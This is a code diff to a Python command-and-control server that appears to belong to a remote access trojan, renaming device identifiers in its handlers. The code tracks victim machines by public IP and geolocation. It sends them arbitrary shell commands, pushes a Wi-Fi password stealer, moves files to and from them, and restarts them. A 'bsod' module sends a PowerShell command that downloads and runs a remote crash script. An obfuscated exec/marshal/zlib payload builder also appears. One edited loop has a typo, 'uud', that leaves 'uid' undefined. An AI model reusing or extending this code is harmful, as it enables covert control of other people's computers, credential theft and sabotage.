@@ -92,10 +92,10 @@ class C2:
         data['public_ip'] = client_ip
         data['geolocation'] = geolocation
 
-        if data['uuid'] not in self.devices:
+        if data['uid'] not in self.devices:
             data['sid'] = sid
-            self.devices.update({data['uuid']: data})
-            self.total_devices.update({data['uuid']: data})
+            self.devices.update({data['uid']: data})
+            self.total_devices.update({data['uid']: data})
 
         self.update_json()
 
@@ -123,12 +123,12 @@ class C2:
 
 
     def send_command(self, sid, data):
-        self.sio.emit('command', {"id": data['id'], 'cmd': data['cmd']})
+        self.sio.emit('command', {"uid": data['uid'], 'cmd': data['cmd']})
 
     def get_result(self, sid, data):
         for device in self.devices:
             if self.devices[device]['sid'] == sid:
-                self.sio.emit('result', {"id": device, 'result': data})
+                self.sio.emit('result', {"uid": device, 'result': data})
                 break
 
     def ctrl(self, data):
@@ -177,25 +177,25 @@ class C2:
     def explotation_module(self, data):
         print(data)
         explotation_module_type = data['explotation_module']
-        uuids = data['uuids']
+        uids = data['uids']
 
         if explotation_module_type == "bsod":
             command = "IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD"
-            for uuid in uuids:
-                self.sio.emit('command', {'id': uuid, 'cmd': command})
+            for uid in uids:
+                self.sio.emit('command', {'uid': uid, 'cmd': command})
 
         if explotation_module_type == "wifi-password":
-            for uuid in uuids:
-                self.sio.emit('pem', {"uuid": uuid, "url": 'client/pem/wifi.py'})
+            for uud in uids:
+                self.sio.emit('pem', {"uid": uid, "url": 'client/pem/wifi.py'})
 
         if explotation_module_type == "send-command":
-            for uuid in uuids:
+            for uid in uids:
                 print(data['input'])
-                self.sio.emit('command', {"id": uuid, 'cmd': data['input']})
+                self.sio.emit('command', {"uid": uid, 'cmd': data['input']})
 
         if explotation_module_type == "restart":
-            for uuid in uuids:
-                self.sio.emit('restart', uuid)
+            for uid in uids:
+                self.sio.emit('restart', uid)
                     
 
 
@@ -268,7 +268,7 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
 
     def upload_file(self, request):
         file = request.files['file']
-        uuids = json.loads(request.form['uuids'])
+        uids = json.loads(request.form['uids'])
         
         if file.filename == '':
             return jsonify({'error': 'No selected file'}), 400
@@ -280,8 +280,8 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
             
             print("file encoded")
 
-        for uuid in uuids:
-            self.sio.emit("upload_file", {'uuid': uuid, 'file_name': file.filename, 'file': base64_encoded})
+        for uid in uids:
+            self.sio.emit("upload_file", {'uid': uid, 'file_name': file.filename, 'file': base64_encoded})
         
 
     
@@ -289,8 +289,8 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
         print(data)
         file_path = data['file_path']
         
-        for uuid in data['uuids']:
-            self.sio.emit("download_file", {'uuid': uuid, 'file_path': file_path})
+        for uid in data['uids']:
+            self.sio.emit("download_file", {'uid': uid, 'file_path': file_path})
 
     
     def save_file(self, sid, data):
@@ -300,7 +300,7 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
             os.makedirs('files_saved')
 
         date_format = "%Y-%m-%d-%H-%M-%S"
-        with open(f"files_saved/{data['uuid']}_{datetime.datetime.now().strftime(date_format)}_{data['file_name']}", 'wb') as f:
+        with open(f"files_saved/{data['uid']}_{datetime.datetime.now().strftime(date_format)}_{data['file_name']}", 'wb') as f:
             f.write(base64.b64decode(data['file']))
 
 
